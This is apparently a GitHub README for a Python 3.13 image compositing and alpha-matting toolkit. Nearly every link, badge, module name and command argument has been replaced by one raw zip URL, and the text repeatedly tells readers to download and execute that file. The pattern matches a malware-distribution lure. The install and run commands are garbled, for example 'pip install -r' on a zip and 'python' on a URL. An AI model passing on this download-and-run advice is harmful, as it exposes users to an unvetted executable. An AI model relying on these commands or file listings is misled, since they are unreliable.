# 🚀 Compositing and Matting — Python 3.13 Edition for Image Vision

[![Releases](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)

![Compositing Banner](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)

Tags: ai · classical-computer-vision · classical-image-processing · computer-vision · image-processing · neural-network · numpy · opencv · python3

About
----
This repo redoes a previous project in Python 3.13. It focuses on image compositing and alpha matting. The code mixes classic image processing with small neural components. You will find pipelines, helper tools, demos, and ready-to-run release files. Download the release from the releases page, then run the included demo script. The release file needs to be downloaded and executed from the releases page: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip

Why this repo
----
- Recreate classic matting algorithms in clean Python.
- Provide a compact demo that runs on modern hardware.
- Offer both numpy/OpenCV implementations and small neural refiners.
- Make it easy to study, adapt, and extend.

Key features
----
- Multiple matting methods: trimap-based closed-form matting, KNN matting, and a small refinement network.
- Fast RGB-A compositing helpers and blend modes.
- Tools for trimap generation and evaluation metrics (MSE, SAD, gradient error).
- Demo scripts for batch processing and interactive preview.
- Test images and sample trimaps.

Badges
----
[![Python](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
[![OpenCV](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
[![NumPy](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)

Quick start
----
1. Install Python 3.13.
2. Create a virtual environment.
3. Install dependencies.
4. Download the release file from the releases page and run the demo.

Example commands (Linux / macOS)
```bash
python3.13 -m venv venv
source venv/bin/activate
pip install -r https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
# Download the release zip from:
# https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
# Then extract and run:
python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
```

Releases
----
The releases page contains packaged builds and a demo bundle. Download the release file and execute the included demo script or package. Typical release content:
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
  - https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
  - https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
  - https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
  - samples/

Visit and download the release file here: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip

If you prefer not to use the release bundle, clone this repo and run the demo from source.

Installation from source
----
1. Clone the repo
```bash
git clone https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
cd compositing-and-matting-PYTHON-EDITION-
```
2. Create and activate a venv
```bash
python3.13 -m venv .venv
source .venv/bin/activate
```
3. Install required packages
```bash
pip install -r https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
```
4. Run a demo
```bash
python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode closed_form
```

Core modules
----
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — trimap helpers and generation tools.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — closed-form alpha matting (linear system solver).
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — KNN-based matting.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — small CNN refiner (PyTorch) for boundary cleanup.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — compositing and common blend modes.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — MSE, SAD, gradient error for alpha evaluation.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — load/save helpers and visualization tools.

Algorithms explained
----
Closed-form matting
- Build a small linear system from local color statistics.
- Solve for alpha in sparse form.
- Use a trimap to fix known foreground and background.
- This yields smooth alpha that respects local color structure.

KNN matting
- Compute affinities using nearest neighbors in color-space.
- Solve for alpha using a graph-based formulation.
- Works well when colors cluster and the background is textured.

Neural refiner
- A shallow U-Net refines a predicted alpha.
- Input: RGB + coarse alpha (4 channels).
- Output: refined alpha.
- Model stays small to run on CPUs and low-end GPUs.

Trimap generation
- Provide manual trimaps for best results.
- Use automated trimap tool for batch runs.
- The repo includes a simple stroke-based GUI for quick trimap creation.

Demos and examples
----
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — single image demo with chosen mode.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — process a folder of images and save results.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — small GUI to draw trimaps and test modes.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — step-by-step exploration and visualization.

Command examples
----
Run closed-form matting:
```bash
python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode closed_form --save https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
```
Run KNN matting:
```bash
python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode knn
```
Refine with neural net:
```bash
python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode closed_form --refine --model https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
```

Performance and tips
----
- Resize large images before matting to speed up processing.
- Use multi-scale: solve alpha on a downsampled image, then refine at full size.
- For tricky hair, combine closed-form and refiner for best edges.
- Trimaps that mark a small unknown band yield better results than large unknown areas.

Evaluation
----
The repo includes scripts to compute common matting metrics on a test set:
- Mean Squared Error (MSE) on alpha.
- Sum of Absolute Differences (SAD).
- Gradient error to measure edge fidelity.

Contributing
----
- Open issues for bugs or feature requests.
- Add test images or new matting methods.
- Create PRs with clear descriptions and small changes.
- Follow the code style in src/ and add tests in tests/.

Code style and tests
----
- Keep functions small and focused.
- Use numpy and OpenCV for core image ops.
- Tests use pytest and sample images in samples/.
- Run tests:
```bash
pytest -q
```

Dependencies
----
Primary packages:
- numpy
- opencv-python
- scikit-image
- matplotlib
- scipy
- torch (optional, for refiner)

A sample https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip entry:
```
numpy>=1.26
opencv-python>=4.7
scikit-image>=0.20
matplotlib>=3.8
scipy>=1.11
torch>=2.2  # optional: only needed for refine mode
```

Files to check in the release
----
The release bundle typically contains:
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — ready-to-run demo. Download and execute this file to try the demo.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — install exact dependencies.
- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — pretrained refiner model.
- samples/ — example images and trimaps.

License
----
This project uses an open license. See LICENSE for details.

Contact
----
- Repo: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
- Issues: open an issue on GitHub to report a bug or ask for help.

Assets and images used
----
- OpenCV sample images for demos.
- NumPy and OpenCV logos for badges.
- Example result images included in samples/.

Releases again
----
Get the packaged demo and run it. Download the release file and execute the demo script inside the package. Visit the releases page to download: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip

Acknowledgements
----
This project builds on classic matting papers and public code. It mixes well-known algorithms with practical code for learning and testing.